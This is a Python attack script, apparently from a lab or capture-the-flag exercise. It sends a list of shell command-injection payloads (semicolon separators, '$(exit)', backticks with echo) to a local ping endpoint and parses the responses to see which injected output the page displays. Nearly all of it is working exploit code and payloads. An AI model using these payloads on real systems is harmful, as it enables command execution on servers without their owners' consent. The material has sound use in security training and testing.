import requests
import re

url = "http://127.0.0.1:33052/ping"

# Strategy: Make ping fail so only our echo output matches regex
# Try invalid IPs, hostnames, or syntax that causes ping to fail
payloads = [
    # Invalid IP - ping should fail
    'invalid;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Empty before semicolon
    ';echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Hostname that doesn't exist
    'nonexistent.host;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Invalid IP format
    '999.999.999.999;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Just a semicolon with echo
    ';echo "5 packets transmitted, 5 received, 0% packet loss"',
    
    # Using localhost differently
    'localhost;echo "3 packets transmitted, 3 received, 0% packet loss"',
    
    # Malformed IP
    '1.2.3;echo "4 packets transmitted, 4 received, 0% packet loss"',
    
    # IP with character that breaks ping
    '127.0.0.1a;echo "6 packets transmitted, 6 received, 0% packet loss"',
    
    # Just command substitution output matching regex
    'x;echo "7 packets transmitted, 7 received, 0% packet loss"',
    
    # Try without any IP-like thing
    'echo "8 packets transmitted, 8 received, 0% packet loss"',
    
    # Space before semicolon
    ' ;echo "9 packets transmitted, 9 received, 0% packet loss"',
    
    # Using parameter that causes ping to error
    '-c 1;echo "10 packets transmitted, 10 received, 0% packet loss"',
    
    # Multiple echoes before ping format
    'a;echo BEFORE;echo "11 packets transmitted, 11 received, 0% packet loss"',
    
    # What if output has different numbers?
    'b;echo "100 packets transmitted, 50 received, 50% packet loss"',
    
    # Try to use subshell output as IP (might fail ping but execute command)
    '$(exit);echo "12 packets transmitted, 12 received, 0% packet loss"',
    
    # Using backticks same way
    '`false`;echo "13 packets transmitted, 13 received, 0% packet loss"',
]

print("="*80)
print("Testing Invalid IP + Command Injection")
print("="*80)

results = []

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {payload}")
    print("-"*60)
    
    try:
        resp = requests.post(url, data={"ip_address": payload}, timeout=10)
        
        print(f"Status: {resp.status_code}")
        print(f"Response ({len(resp.text)} chars):")
        print(resp.text)
        
        # Extract the displayed values
        match = re.search(r'Packets Transmitted: ([^,]+), Packets Received: ([^,]+), Packet Loss: ([^%]+)%', resp.text)
        if match:
            trans, recv, loss = match.groups()
            print(f"[EXTRACTED] Transmitted: '{trans}', Received: '{recv}', Loss: '{loss}'")
            
        results.append({
            'test': i,
            'payload': payload,
            'response': resp.text,
            'match': match.groups() if match else None
        })
        
    except Exception as e:
        print(f"ERROR: {e}")

# Analysis
print("\n" + "="*80)
print("ANALYSIS: Which values appear in Transmitted field?")
print("="*80)
for r in results:
    if r['match']:
        trans = r['match'][0]
        # Check if it's not just '2' (normal ping result) or 'ping: 1' (error)
        if trans not in ['2', 'ping: 1']:
            print(f"\n[TEST {r['test']}] CUSTOM VALUE: '{trans}'")
            print(f"Payload: {r['payload']}")
        else:
            print(f"[Test {r['test']:2d}] Standard value: '{trans}'")

